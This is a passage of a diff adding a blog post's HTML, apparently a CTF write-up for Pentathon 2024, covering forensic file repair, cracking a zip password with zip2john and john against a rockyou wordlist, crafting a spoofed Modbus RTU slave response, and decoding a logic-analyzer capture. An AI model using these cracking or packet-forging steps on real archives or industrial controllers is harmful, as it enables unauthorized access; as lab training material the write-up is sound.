class="string">&#x27;new_file.png&#x27;</span></span><br><span class="line">remove_extra_data(ip, op)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>you don’t have to make your life difficult, can just do manually. its just ‘cause i want problem i dont want peace :p</p>
+</blockquote>
+<p>we got the final output as </p>
+<p><img src="/imgs/post8/forensic/recovered_png.png" alt="recovered_png.png"></p>
+<p>its not flag obviously, something to do with alpha layer. After trying <strong>GIMP</strong> and some LSB stegno tools i didn’t get the desired result, after long try zsteg did the magic.</p>
+<p><img src="/imgs/post8/forensic/epic_chl_flag.png" alt="epic_chl_flag.png"></p>
+<h3 id="Data-Divergence"><a href="#Data-Divergence" class="headerlink" title="Data Divergence"></a>Data Divergence</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>Delve deep into a labyrinthine digital landscape to uncover a secret file.</p>
+</blockquote>
+<p>a file <strong>chall.dat</strong> is given, trying to figure it out shows that</p>
+<p><img src="/imgs/post8/forensic/data_dievergence.png" alt="data_dievergence.png"></p>
+<p>its a zip file and has extra  17168 bytes at the beginnig of the file moreover its encrypted.</p>
+<p>so lets first delete the extra bytes from it </p>
+<p><img src="/imgs/post8/forensic/data_dievergence2.png" alt="data_dievergence2.png"></p>
+<p>so its normal zip now and we can unzip it using password, as we dont have one we have to brute force it, i am used john here</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ zip2john output.zip &gt; chall.hash </span><br><span class="line">ver 2.0 output.zip/flag.gif PKZIP Encr: cmplen=46394, decmplen=46618, crc=37DB16FA ts=9739 cs=37db <span class="built_in">type</span>=8</span><br><span class="line">                                                                      </span><br><span class="line">┌──(zr0x㉿pwn3r)-[/tmp]</span><br><span class="line">└─$ john chall.hash --wordlist=/tmp/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>and this was the flag file </p>
+<p><img src="/imgs/post8/forensic/data_divergence_flag.gif" alt="data_divergence_flag.gif"></p>
+<h2 id="OT-Operational-Technology-Hardware"><a href="#OT-Operational-Technology-Hardware" class="headerlink" title="OT(Operational Technology)&#x2F;Hardware"></a>OT(Operational Technology)&#x2F;Hardware</h2><p>This category of challenge was new to me as i never tried to solve Hardware challenges, i solved these two following challenges after reading other participants writeups.</p>
+<h3 id="M0dBu5"><a href="#M0dBu5" class="headerlink" title="M0dBu5"></a>M0dBu5</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>We intercepted a communication from a Modbus master to a slave on the RS485 bus as given below. Your goal, is to craft a response packet as the slave with 73(decimal) as slave data. Master requirements are 05-02-00-00-00-01-85-BD. Flag format: flag{XX-XX-XX-XX-XX-XX} or flag{XX-XX-XX-XX-XX-XX-XX}</p>
+</blockquote>
+<h4 id="What-is-Modbus"><a href="#What-is-Modbus" class="headerlink" title="What is Modbus"></a>What is Modbus</h4><p>So if you don’t know what modbus is like i didn’t know then, then chatGPT here.</p>
+<p>Modbus is a communication protocol commonly used in industrial automation and control systems to exchange data between electronic devices. Modbus is simple, open, and widely adopted, making it one of the most popular protocols for connecting electronic devices in industrial environments.</p>
+<p>There are several variants of the Modbus protocol, but the two most common are Modbus RTU (Remote Terminal Unit) and Modbus TCP (Transmission Control Protocol). Modbus RTU is a serial communication protocol that uses RS-232 or RS-485 for communication over a physical medium, while Modbus TCP is an Ethernet-based protocol that utilizes TCP&#x2F;IP for communication over Ethernet networks.</p>
+<p>Modbus operates on a master-slave architecture, where one device (the master) initiates communication and commands, and one or more devices (the slaves) respond to those commands. It supports various data types, including digital inputs&#x2F;outputs, analog inputs&#x2F;outputs, and registers for storing numerical data.</p>
+<p>for more info check this <a target="_blank" rel="noopener" href="https://camatsystem.com/wp-content/uploads/2015/12/Modbus-manual-TD80.pdf">PDF</a></p>
+<p>So, after reading this and description given for the challenge its clear that challenge is about Modbus RTU RS-485  and you may infer now is that we have to craft a response packet to the modbus master following this Master requirements,<br><strong>05-02-00-00-00-01-85-BD</strong></p>
+<p>where according to <a target="_blank" rel="noopener" href="https://camatsystem.com/wp-content/uploads/2015/12/Modbus-manual-TD80.pdf#MAPPING%20ULYSCOM%20MODBUS_ed04.indd%3A.14915">this</a> reference from above PDF.</p>
+<p><img src="/imgs/post8/ot/modbus1.png" alt="modbus1.png"></p>
+<ul>
+<li>Slave Address: 05</li>
+<li>Function Code: 02 , here Read Discrete Inputs</li>
+<li>Starting register: 0000</li>
+<li>quantity of discrete inputs being requested: 0001</li>
+<li>CRC (Cyclic Redundancy Check): 8C 3E (CRC calculated based on the packet content)</li>
+</ul>
+<p>where,</p>
+<p>Slave address is a unique identifier assigned to each slave device on the network. The slave address determines which slave device will respond to a specific request sent by the master device. The slave address is typically an 8-bit value ranging from 1 to 247. In a Modbus network, any valid slave address can be used, but it must match the address configured on the slave device being addressed.</p>
+<p>Function code specifies the type of operation or action that the Modbus slave device should perform in response to a request from the Modbus master device. Each function code corresponds to a specific type of operation, such as reading data from the slave device, writing data to the slave device, or performing control actions.</p>
+<p>“00-00” indicates the starting address of the discrete inputs being requested. In Modbus, discrete inputs are typically addressed starting from 0000, so “00-00” represents the starting address 0000.</p>
+<p>“00-01” indicates the quantity of discrete inputs being requested. In this case, “00-01” represents a request to read one discrete input.</p>
+<p>The CRC (Cyclic Redundancy Check) in Modbus communication is a two-byte field used for error checking to ensure the integrity of the data being transmitted. It is calculated based on the contents of the entire message, excluding the starting colon (:) and ending CR-LF (Carriage Return-Line Feed) characters in the Modbus message frame.<br>if you are interested how CRC generated then,</p>
+<p><img src="/imgs/post8/ot/modbus2.png" alt="modbus2.png"></p>
+<p>so again taking reference from above <a target="_blank" rel="noopener" href="https://camatsystem.com/wp-content/uploads/2015/12/Modbus-manual-TD80.pdf#MAPPING%20ULYSCOM%20MODBUS_ed04.indd%3A.14915">PDF</a>, Slave response should be -</p>
+<ul>
+<li>Slave Address: 05</li>
+<li>Function Code: 02 </li>
+<li>Byte Count: 02 , represents the number of bytes of data in the response message payload, excluding the address, function code, and CRC bytes. </li>
+<li>Requested Data: 00 49 (73 in decimal, Already given)</li>
+<li>CRC (Cyclic Redundancy Check): 89 8E</li>
+</ul>
+<p>we can calculate CRC from <a target="_blank" rel="noopener" href="https://npulse.net/en/online-modbus">here</a></p>
+<p><img src="/imgs/post8/ot/modbus3.gif" alt="modbus3.gif"></p>
+<p>so the flag will be -</p>
+<p><code>flag&#123;05-02-02-00-49-89-8E&#125;</code></p>
+<h3 id="L0g1c-sn1ff"><a href="#L0g1c-sn1ff" class="headerlink" title="# L0g1c_sn1ff"></a># L0g1c_sn1ff</h3><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>Our spy has captured a digital signal from an unknown device using a saleae logic analyzer. Your mission, should you choose to accept it, is to decode the signal and unveil the secret message embedded within. Good luck, and may your decoding skills be sharp and swift. Flag Format: flag{printable_ascii}</p>
+</blockquote>
+<p>we have given Saleae Logic Analyzer file that contain digital signal from an unkown device, where we have to decode the signal to get the secret message ths is flag. after reading some previous ctf challenges i came to know that we have to somehow find out the baud rate or data speed transfer rate of siginal.</p>
+<p>i tried some time but did not able to get the correct baud rate, but later after reading writup i got to know there is automated extension for this purpose that is<br><strong>baud rate estimate</strong></p>
+<p><img src="/imgs/post8/ot/logic_sniff1.png" alt="logic_sniff1.png"></p>
+<p>we can get the correct baud rate i.e. </p>
+<p><img src="/imgs/post8/ot/logic_sniff2.gif" alt="logic_sniff2.gif"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archive">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Health-care"><span class="toc-number">1.1.</span> <span class="toc-text">Health care</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Descripttion"><span class="toc-number">1.1.1.</span> <span class="toc-text">Descripttion</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Solve"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#USB-Ultra-Secure-Bank"><span class="toc-number">1.2.</span> <span class="toc-text">USB - Ultra Secure Bank</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Descripttion-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Descripttion</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#overflow"><span class="toc-number">2.1.</span> <span class="toc-text">overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">2.1.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Main-func"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">Main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Flag-func"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">Flag func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bof"><span class="toc-number">2.2.</span> <span class="toc-text">bof</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Main-func-1"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">Main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#secretFunction-func"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">secretFunction func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REV"><span class="toc-number">3.</span> <span class="toc-text">REV</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#byte-by-byte"><span class="toc-number">3.1.</span> <span class="toc-text">byte by byte</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Main-func-2"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">Main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-CTF"><span class="toc-number">4.</span> <span class="toc-text">Post CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">5.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Echoes-of-the-Unseen"><span class="toc-number">5.1.</span> <span class="toc-text">Echoes of the Unseen</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-3"><span class="toc-number">5.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-Divergence"><span class="toc-number">5.2.</span> <span class="toc-text">Data Divergence</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-4"><span class="toc-number">5.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OT-Operational-Technology-Hardware"><span class="toc-number">6.</span> <span class="toc-text">OT(Operational Technology)&#x2F;Hardware</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#M0dBu5"><span class="toc-number">6.1.</span> <span class="toc-text">M0dBu5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-5"><span class="toc-number">6.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-Modbus"><span class="toc-number">6.1.2.</span> <span class="toc-text">What is Modbus</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#L0g1c-sn1ff"><span class="toc-number">6.2.</span> <span class="toc-text"># L0g1c_sn1ff</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-6"><span class="toc-number">6.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&text=CTF WriteUp: Pentathon 2024"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&is_video=false&description=CTF WriteUp: Pentathon 2024"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF WriteUp: Pentathon 2024&body=Check out this article: https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&name=CTF WriteUp: Pentathon 2024&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&t=CTF WriteUp: Pentathon 2024"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    Durgesh
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archive">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
